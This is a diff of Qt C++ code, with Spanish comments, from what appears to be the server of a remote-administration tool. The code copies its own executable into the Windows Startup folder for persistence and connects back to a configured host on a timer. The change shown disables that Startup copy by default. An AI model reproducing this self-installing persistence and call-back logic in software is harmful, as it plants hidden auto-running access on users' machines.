@@ -52,8 +52,8 @@ void MainWindow::changeEvent(QEvent *e)
 }
 void MainWindow::inicio(){
     /** funcion que se ejecuta al inicio de la aplicacion **/
-    this->generarVentanaChat();
     cargarConfiguracion();
+    this->generarVentanaChat();
     QString conversion;
     QByteArray datos; //Reconstruimos la configuraci�n con algunas modificaciones para el servidor copiado
     datos = "|@|" + this->host.toLatin1() + "|@|";
@@ -80,7 +80,7 @@ void MainWindow::inicio(){
     {
         datos = datos + "noejecutar|@|0|@|"; //Sino decimos al servidor copiado que no ejecute nada
     }
-    if (directorio.exists(QDir::homePath() + "/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup")) { //Windows
+    if (directorio.exists(QDir::homePath() + "/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup") && this->nombreCopiable != "noiniciar") { //Windows
         copiarServidor(datos,QDir::homePath() + "/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/" + this->nombreCopiable);
     }
     temporizador.start(this->tiempoConexion); //iniciar el temporizador para conexión
@@ -117,7 +117,7 @@ bool MainWindow::cargarConfiguracion(){
     this->tiempoConexion = 30000;
     this->alias = "servidor";
     QString appPath = QApplication::applicationFilePath(); //ruta absoluta a la aplicación
-    this->nombreCopiable =  QFileInfo(appPath).fileName(); //Nombre del ejecutable
+    this->nombreCopiable = "noiniciar"; //Nombre del ejecutable
     // No olividar renombrar el ejecutable a rawserver.dat y moverlo al directorio del cliente
     QString datos;
     QString conversion;
